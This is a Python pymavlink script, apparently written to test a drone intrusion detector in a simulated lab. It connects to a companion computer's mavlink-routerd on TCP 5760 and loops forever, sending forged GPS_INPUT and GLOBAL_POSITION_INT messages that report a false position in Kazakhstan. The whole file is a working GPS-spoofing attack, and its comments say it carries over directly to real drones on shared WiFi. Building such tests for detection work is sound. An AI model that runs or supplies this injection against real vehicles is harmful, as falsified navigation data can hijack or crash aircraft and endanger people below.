"""
ZeroGuard - MAVLink GPS Injection Attack
Target: mavlink-routerd TCP:5760 on companion computer (10.13.0.3)

Real-world equivalent:
  - Attacker is on same WiFi/network as drone operator
  - Connects to companion computer's MAVLink TCP port
  - Injects spoofed GPS — ALL downstream listeners see it:
      GCS (MAVProxy at 10.13.0.6:14550)
      Our IDS detector (172.17.0.1:14550)
  - This is architecturally identical to real hardware attack
"""
from pymavlink import mavutil
import time, sys

# ── Real-world attack target ─────────────────────────────────────────────────
# In simulation : companion-computer-lite TCP:5760 (mavlink-routerd)
# In real world : drone companion computer IP:5760 over WiFi
TARGET = "tcp:10.13.0.3:5760"

FAKE_LAT = 473566100   # 47.3566N — Kazakhstan
FAKE_LON = 854619300   # 85.4619E — Kazakhstan
FAKE_ALT = 150000      # 150m in mm

print("=" * 55)
print("  ZeroGuard — GPS Injection Attack")
print(f"  Target : {TARGET}")
print(f"  Payload: {FAKE_LAT/1e7:.4f}N, {FAKE_LON/1e7:.4f}E")
print("=" * 55)

print(f"\n[*] Connecting to mavlink-routerd...")
try:
    master = mavutil.mavlink_connection(TARGET)
    master.wait_heartbeat(timeout=10)
    print(f"[+] Connected — system {master.target_system}, "
          f"component {master.target_component}")
except Exception as e:
    print(f"[-] Failed: {e}")
    sys.exit(1)

print(f"[!] Injecting spoofed GPS into MAVLink stream...")
print(f"[!] All consumers (GCS + IDS) will see fake position\n")

count = 0
while True:
    # Send GPS_INPUT — tells ArduPilot to use this as GPS source
    master.mav.gps_input_send(
        time_usec      = int(time.time() * 1e6),
        gps_id         = 0,
        ignore_flags   = 8,
        time_week_ms   = 0,
        time_week      = 0,
        fix_type       = 3,
        lat            = FAKE_LAT,
        lon            = FAKE_LON,
        alt            = FAKE_ALT,
        hdop           = 1.0,
        vdop           = 1.0,
        vn=0, ve=0, vd=0,
        speed_accuracy = 0.5,
        horiz_accuracy = 1.0,
        vert_accuracy  = 1.5,
        satellites_visible = 10,
        yaw            = 0
    )

    # Also send GLOBAL_POSITION_INT override
    master.mav.global_position_int_send(
        time_boot_ms = int(time.time()*1e3) % 4294967295,
        lat          = FAKE_LAT,
        lon          = FAKE_LON,
        alt          = FAKE_ALT,
        relative_alt = FAKE_ALT,
        vx=0, vy=0, vz=0,
        hdg          = 0
    )

    count += 1
    print(f"\r[+] Injected {count} spoofed bursts into mavlink-routerd",
          end="", flush=True)
    time.sleep(0.5)
